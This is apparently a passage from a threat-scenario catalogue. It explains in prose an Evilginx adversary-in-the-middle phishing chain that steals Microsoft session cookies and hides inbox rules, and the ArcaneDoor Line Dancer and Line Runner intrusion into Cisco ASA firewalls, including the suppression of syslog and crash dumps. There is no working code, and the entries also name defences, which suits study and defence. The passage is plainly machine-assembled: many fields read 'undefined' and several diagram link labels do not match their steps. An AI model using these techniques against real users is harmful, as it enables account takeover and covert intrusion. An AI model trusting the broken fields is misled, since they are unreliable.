  1. **[undefined] undefined** (undefined): The victim clicks a link to view a PDF document and lands at the two-way-mirror booth (Evilginx). Because the booth is relaying the real Microsoft login screen live from behind the glass, every logo, font, and custom company banner looks 100% authentic. After building trust via email, the attacker sends a link to a lookalike domain (e.g., login.micros0ft-auth-portal.com, registered with a valid Let’s Encrypt HTTPS certificate so the browser still displays a padlock icon). When the victim clicks the link, the attacker’s Evilginx server fetches the genuine login.microsoftonline.com page live in the background and rewrites the domain names inside the HTML on the fly (so the victim sees their own company’s real logo, custom background image, and live Microsoft login prompts). Unlike traditional phishing kits that host a static HTML copy of a login page (which breaks when MFA challenges or dynamic JavaScript run), an AiTM reverse proxy relays every HTTP request and response between the victim’s browser and Microsoft Entra ID in real time. On the diagram, follow Step #1 / Link #1 (#1→ AITM PROXY AUTH / ⇠#1 RESP ESTSAUTH Issued) from Node ① (#1 Evilginx3 AiTM Reverse Proxy) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Microsoft Defender XDR & Sentinel).
  2. **[undefined] undefined** (undefined): The victim types their password and enters the 6-digit MFA code from their phone. The man-in-the-middle booth passes both straight through the window to Microsoft in milliseconds, and when Microsoft hands back the Set-Cookie: ESTSAUTHPERSISTENT VIP pass, the booth records a copy in its database. The victim enters their corporate password and completes their real MFA challenge (typing a 6-digit Authenticator code or tapping "Approve" on a push notification). Evilginx forwards both requests straight to login.microsoftonline.com in milliseconds. Once MFA succeeds, Microsoft responds with HTTP 200 OK containing Set-Cookie: ESTSAUTHPERSISTENT=... (the master browser session cookie that Microsoft issues after both password and MFA are verified, which passes through Evilginx in plaintext because the HTTPS connection from the victim terminates on the Evilginx proxy first). Because the victim’s TLS session terminates on the attacker’s Evilginx server before Evilginx opens a second TLS session to Microsoft, Evilginx can read and save every HTTP header, including Set-Cookie: ESTSAUTHPERSISTENT and ESTSAUTH, the instant MFA completes. In the documented AADNonInteractiveSignIn exchange from DMZ Reverse Proxy & SPAN Tap to Target User Browser (WKS-EXEC-01), Target User Browser (WKS-EXEC-01) responds with RESP MFA Bypassed (confirming that the COOKIE REPLAY request succeeded on Target User Browser (WKS-EXEC-01) and establishing the runtime state required for Step #3 STEALTH INBOX RULE CREATION & BEC EXFILTRATION). On the diagram, follow Step #2 / Link #2 (#2→ COOKIE REPLAY / ⇠#2 RESP MFA Bypassed) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 Target User Browser (WKS-EXEC-01)), monitored by Node ⑥ (#6 Microsoft Defender XDR & Sentinel).
  3. **[undefined] undefined** (undefined): Minutes later, the attacker pastes that photocopied ESTSAUTHPERSISTENT VIP pass into their own browser in another country, walks straight into the victim’s Outlook inbox, and sets up a hidden mail-forwarding rule so they keep getting copies of every email. The attacker imports the stolen ESTSAUTHPERSISTENT cookie into their own browser using a cookie editor and opens outlook.office.com. Because holding a valid ESTSAUTHPERSISTENT cookie tells Microsoft "this browser already passed password + MFA checks", Outlook opens the victim’s mailbox immediately without asking for a password or triggering an MFA prompt on the victim’s phone. The attacker then creates a hidden Inbox rule (New-InboxRule, automatically forwarding or moving incoming security/reset emails so the victim never notices ongoing access). Why did MFA fail to stop this? Because TOTP codes and push approvals only verify the login event, not the domain in the browser bar. Only phishing-resistant FIDO2 / WebAuthn passkeys (which cryptographically bind the login signature to the exact domain name login.microsoftonline.com) or Token Protection (device-bound session cookies) defeat AiTM proxies. On the diagram, follow Step #3 / Link #3 (#3→ HIDE INBOX RULE / ⇠#3 RESP Rule Created) from Node ③ (#3 Target User Browser (WKS-EXEC-01)) to Node ④ (#4 Cookie Replay Session (Pass-the-Cookie)), monitored by Node ⑥ (#6 Microsoft Defender XDR & Sentinel).

## 17. Cisco Talos — ArcaneDoor (UAT4356): Cisco ASA Zero-Days, Line Dancer & Line Runner
- **Scenario ID:** `talos-arcanedoor-asa`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/talos-arcanedoor-asa
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2024-20353 (8.6 HIGH), CVE-2024-20359 (6.0 MEDIUM (Chained Root Persistence))
- **Attributed Threat Actors:** UAT4356 (STORM-1849), State-Sponsored Edge Router Intrusion Teams
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): Every day, thousands of remote employees send <config-auth> XML forms to the Cisco ASA VPN gate to log in. The attacker sends that exact same XML form, but tucks a 32-byte secret handshake and Base64 shellcode inside the <host-scan-reply> field. To control the compromised Cisco ASA firewall without opening any suspicious new network port, the attacker sends standard HTTPS POST requests on port 443 to /CSCOSSLC/config-auth (the exact URL that every remote employee’s Cisco AnyConnect VPN client connects to every morning, allowing the attacker’s command-and-control traffic to blend seamlessly into legitimate corporate VPN logins). Inside the XML body’s <host-scan-reply> tag, the attacker places a 32-byte magic identifier followed by a Base64-encoded shellcode command. Normally, the ASA’s XML parser processes <host-scan-reply> during AnyConnect posture checks. Because the Line Dancer hook intercepts the buffer inside the lina process as soon as it spots the 32-byte magic header (before standard VPN authentication even finishes), the attacker can send commands without needing a valid VPN username or password. On the diagram, follow Step #1 / Link #1 (#1→ LINE RUNNER BOOT / ⇠#1 ACK CVE-2024-20359) from Node ① (#1 UAT4356 (Storm-1849) Actor) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Cisco Talos / NetFlow SIEM).
  2. **[undefined] undefined** (undefined): When the Line Dancer implant inside the firewall’s lina process spots that 32-byte secret handshake, its first move is to unplug the guardhouse’s alarm bell (disabling Syslog and crash dumps) before silently running the attacker’s router commands. Inside the ASA’s main lina executable (the monolithic process that handles all firewalling, routing, and VPN sessions on a Cisco ASA), the Line Dancer memory-only implant decodes the incoming shellcode and executes it directly in RAM. Before running reconnaissance or capturing packets, Line Dancer patches the in-memory syslog logging function (temporarily silencing outbound syslog alerts so the SOC’s SIEM server never sees that someone just ran "show running-config" or started a packet capture) and disables crash dumps (so if an exploit attempt crashes a thread, no forensic core dump is written to disk). Because perimeter network appliances cannot run standard Windows/Linux EDR agents, modifying the running lina process in volatile RAM hides the implant from normal CLI checks, and can only be caught on-box by hashing the live memory text segment via verify /md5 system:memory/text. In the documented HTTPS POST scan.xml exchange from DMZ Reverse Proxy & SPAN Tap to Cisco ASA 5500-X Firewall, Cisco ASA 5500-X Firewall responds with RESP 1,420 Bytes (confirming that the LINE DANCER C2 request succeeded on Cisco ASA 5500-X Firewall and establishing the runtime state required for Step #3 SYSLOG SUPPRESSION, PCAP CAPTURE & CONFIG EXFIL). On the diagram, follow Step #2 / Link #2 (#2→ LINE DANCER C2 / ⇠#2 RESP 1,420 Bytes) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 Cisco ASA 5500-X Firewall), monitored by Node ⑥ (#6 Cisco Talos / NetFlow SIEM).
  3. **[undefined] undefined** (undefined): Every time a Cisco ASA firewall boots up, it automatically unzips and runs an old factory setup archive (disk0:/.private/startup-config) if one exists. Line Runner plants a booby-trapped zip file in that exact spot so every reboot automatically re-installs the backdoor. Because Line Dancer lives purely in RAM, rebooting the firewall would normally wipe it out. To survive reboots, the attacker exploits CVE-2024-20359 (a legacy feature in Cisco ASA where the boot sequence automatically looks for a leftover pre-configuration zip archive on the flash drive disk0: and runs the scripts inside it as root during startup). By planting their persistent backdoor (Line Runner) inside that legacy boot archive path, the firewall automatically re-infects its own memory every time the power is cycled. Combining Line Runner (disk0: boot persistence via CVE-2024-20359) with Line Dancer (volatile RAM command execution inside lina) gives the attacker both reboot survival and zero-footprint daily operation. On the diagram, follow Step #3 / Link #3 (#3→ TEXT HASH MISMATCH / ⇠#3 ALERT MODIFIED .TEXT) from Node ③ (#3 Cisco ASA 5500-X Firewall) to Node ④ (#4 Line Dancer Shellcode Engine), monitored by Node ⑥ (#6 Cisco Talos / NetFlow SIEM).
